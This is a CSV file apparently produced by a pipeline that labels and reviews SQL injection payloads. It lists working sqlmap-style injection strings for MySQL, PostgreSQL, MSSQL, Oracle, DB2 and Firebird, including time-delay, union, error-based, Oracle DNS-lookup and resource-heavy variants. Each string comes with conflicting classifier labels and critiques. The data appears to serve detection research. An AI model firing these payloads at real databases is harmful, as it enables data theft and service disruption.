payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
1' ) and sleep ( 5 ) #,time_blind,mysql,0.9,sleep_time,RELABEL,reasoning too short (10 chars),time_blind,mysql,1' ) and sleep ( 5 ) #,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 'cbaj' = 'cbaj,time_blind,generic,0.7,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,generic,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 'cbaj' = 'cbaj,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"-8040"" ) ) ) or make_set ( 3916 = 6787,6787 ) and ( ( ( ""laar"" like ""laar",boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,"-8040"" ) ) ) or make_set ( 3916 = 6787,6787 ) and ( ( ( ""laar"" like ""laar",False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
"-9932"" union all select 4049,4049,4049--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-9932"" union all select 4049,4049,4049--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1' ) ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,0.7,elt_sleep,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,"1' ) ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
"1' and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe,RELABEL,reasoning too short (9 chars),time_blind,oracle,"1' and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",False,0,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected
"1 ) ) ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1 ) ) ) union all select null,null,null,null,null,null,null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1' ) as kbja where 4275 = 4275 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",boolean_blind,mysql,0.7,concat_select,RELABEL,reasoning too short (13 chars),boolean_blind,mysql,"1' ) as kbja where 4275 = 4275 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
1'+ ( select 'hjku' where 1954 = 1954 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) ) +',time_blind,generic,0.7,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,generic,1'+ ( select 'hjku' where 1954 = 1954 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) ) +',False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"1 ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( 1624 = 1624",error_based,mysql,0.7,procedure_analyse,RELABEL,reasoning too short (17 chars),error_based,mysql,"1 ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( 1624 = 1624",False,0,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1"" ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ""smhd"" like ""smhd",error_based,mysql,0.9,extractvalue,RELABEL,reasoning too short (12 chars),error_based,mysql,"1"" ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ""smhd"" like ""smhd",False,0,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"-1174"" union all select 4303,4303,4303,4303#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-1174"" union all select 4303,4303,4303,4303#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1 ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.7,db2_sysjoin,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,"1 ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",False,0,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal
"1' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( 'zxhn' like 'zxhn",boolean_blind,mysql,0.7,row_count,RELABEL,reasoning too short (9 chars),boolean_blind,mysql,"1' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( 'zxhn' like 'zxhn",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1, ( select ( case when ( 1255 = 8025 ) then 1 else 1255* ( select 1255 from mysql.db ) end ) )",boolean_blind,mysql,0.7,mysql_db,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,"1, ( select ( case when ( 1255 = 8025 ) then 1 else 1255* ( select 1255 from mysql.db ) end ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
-1217' ) ) ) order by 1#,boolean_blind,generic,0.5,order_by,RELABEL,reasoning too short (8 chars); confidence too low (0.50),boolean_blind,generic,-1217' ) ) ) order by 1#,False,0,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check
"iif ( 2205 = 4764,1,1/0 )",boolean_blind,mssql,0.7,iif_boolean,RELABEL,reasoning too short (11 chars),boolean_blind,mssql,"iif ( 2205 = 4764,1,1/0 )",False,0,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check
"1"" union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1"" union all select null,null,null,null,null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"select * from generate_series ( 3267,3267,case when ( 3267 = 5900 ) then 1 else 0 end ) limit 1--",heavy_query,postgresql,0.7,generate_series,RELABEL,reasoning too short (15 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,postgresql,"select * from generate_series ( 3267,3267,case when ( 3267 = 5900 ) then 1 else 0 end ) limit 1--",False,0,boolean_blind,postgresql,generic SQL keywords without specific signal,boolean_blind,postgresql,generic SQL structure without strong signal
"-5148"" ) ) or 5310 = 8229",boolean_blind,generic,0.5,or_inequality,RELABEL,reasoning too short (13 chars); confidence too low (0.50),boolean_blind,generic,"-5148"" ) ) or 5310 = 8229",False,0,boolean_blind,generic,Pattern match: 'or 5310 = 8229' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
1 ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( 9505 = 9505,time_blind,postgresql,0.9,pg_sleep,RELABEL,reasoning too short (8 chars),time_blind,postgresql,1 ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( 9505 = 9505,False,0,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal
1 ) ) ) and 9198 = 9198--,boolean_blind,generic,0.5,and_equality,RELABEL,reasoning too short (12 chars); confidence too low (0.50),boolean_blind,generic,1 ) ) ) and 9198 = 9198--,False,0,boolean_blind,generic,Pattern match: 'and 9198 = 9198' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
1%' ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.9,pg_sleep,RELABEL,reasoning too short (8 chars),time_blind,postgresql,1%' ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,False,0,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal
1'+ ( select 'zugq' where 9218 = 9218,union_based,generic,0.7,union_concat,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,generic,1'+ ( select 'zugq' where 9218 = 9218,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"1%' and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and '%' = '",error_based,mssql,0.9,convert_char,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"1%' and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and '%' = '",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"-9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"-1889%' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( '%' = '",out_of_band,oracle,0.9,ctxsys_drithsx,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,"-1889%' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( '%' = '",False,0,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected
"1' and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"1' and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
"1' or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and 'yhkr' = 'yhkr",heavy_query,firebird,0.7,firebird_sysjoin,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,"1' or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and 'yhkr' = 'yhkr",False,0,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal
"-4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1"" where 7158 = 7158",boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,"1"" where 7158 = 7158",False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
"1"" ) ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"1"" ) ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
1 where 3735 = 3735,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1 where 3735 = 3735,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
"1 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) # lgoz",boolean_blind,mysql,0.7,concat_select,RELABEL,reasoning too short (13 chars),boolean_blind,mysql,"1 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) # lgoz",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1%"" ) ) and 9198 = 9198--",boolean_blind,generic,0.5,and_equality,RELABEL,reasoning too short (12 chars); confidence too low (0.50),boolean_blind,generic,"1%"" ) ) and 9198 = 9198--",False,0,boolean_blind,generic,Pattern match: 'and 9198 = 9198' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
"1, ( cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 7823 = 7823 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) )",boolean_blind,postgresql,0.7,postgresql_cast,RELABEL,reasoning too short (15 chars),boolean_blind,postgresql,"1, ( cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 7823 = 7823 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"1'|| ( select 'uvbb' where 7795 = 7795 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) ||'",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"1'|| ( select 'uvbb' where 7795 = 7795 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) ||'",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( 'ksoc' = 'ksoc,time_blind,generic,0.7,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,generic,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( 'ksoc' = 'ksoc,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
select ( case when ( 1005 = 5996 ) then 1 else 1005* ( select 1005 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.7,mssql_db,RELABEL,reasoning too short (8 chars),boolean_blind,mssql,select ( case when ( 1005 = 5996 ) then 1 else 1005* ( select 1005 from master..sysdatabases ) end ) --,False,0,boolean_blind,mssql,generic SQL keywords without specific signal,boolean_blind,mssql,generic SQL structure without strong signal
"-9272%"" ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( ""%"" = """,out_of_band,oracle,0.9,utl_inaddr,RELABEL,reasoning too short (10 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,"-9272%"" ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( ""%"" = """,False,0,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected
1'+ ( select rdwb where 2498 = 2498 and 3429 = 7639--,boolean_blind,generic,0.5,inequality,RELABEL,reasoning too short (10 chars); confidence too low (0.50),boolean_blind,generic,1'+ ( select rdwb where 2498 = 2498 and 3429 = 7639--,False,0,boolean_blind,generic,Pattern match: 'and 3429 = 7639' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
-9191' ) as qtvm where 2838 = 2838 or ( 8459 = 8459 ) *4906--,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,-9191' ) as qtvm where 2838 = 2838 or ( 8459 = 8459 ) *4906--,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
select ( case when ( 4935 = 4734 ) then 4935 else 4935* ( select 4935 from mysql.db ) end ) #,boolean_blind,mysql,0.7,mysql_db,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,select ( case when ( 4935 = 4734 ) then 4935 else 4935* ( select 4935 from mysql.db ) end ) #,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"-9840 ) ) as thod where 4790 = 4790 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",error_based,mssql,0.9,convert_char,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-9840 ) ) as thod where 4790 = 4790 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( '%' = '",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( '%' = '",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
"1 ) ) as hgtl where 3864 = 3864 and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,0.7,elt_sleep,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,"1 ) ) as hgtl where 3864 = 3864 and elt ( 3114 = 3114,sleep ( 5 ) ) #",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
"1%"" ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""%"" = """,out_of_band,oracle,0.9,ctxsys_drithsx,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,"1%"" ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""%"" = """,False,0,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected
"1"" ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ""fbol"" like ""fbol",time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars),time_blind,mysql,"1"" ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ""fbol"" like ""fbol",False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) # eahg",error_based,mysql,0.7,exp_extract,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) # eahg",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"-6294"" union all select 9921,9921,9921,9921,9921,9921--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
"1' ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( 'zpkv' = 'zpkv",error_based,mysql,0.9,updatexml,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1' ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( 'zpkv' = 'zpkv",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1 ) where 6954 = 6954 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars),time_blind,mysql,"1 ) where 6954 = 6954 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"1'|| ( select 'osty' from dual where 6433 = 6433 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) ||'",heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,oracle,"1'|| ( select 'osty' from dual where 6433 = 6433 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) ||'",False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
1' ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( 'hqcz' = 'hqcz,time_blind,mysql,0.7,rlike_sleep,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,1' ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( 'hqcz' = 'hqcz,False,0,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
"1"" ) as ivkw where 4218 = 4218 union all select null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1"" ) as ivkw where 4218 = 4218 union all select null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
1' ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( 'gjja' = 'gjja,time_blind,postgresql,0.9,pg_sleep,RELABEL,reasoning too short (8 chars),time_blind,postgresql,1' ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( 'gjja' = 'gjja,False,0,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal
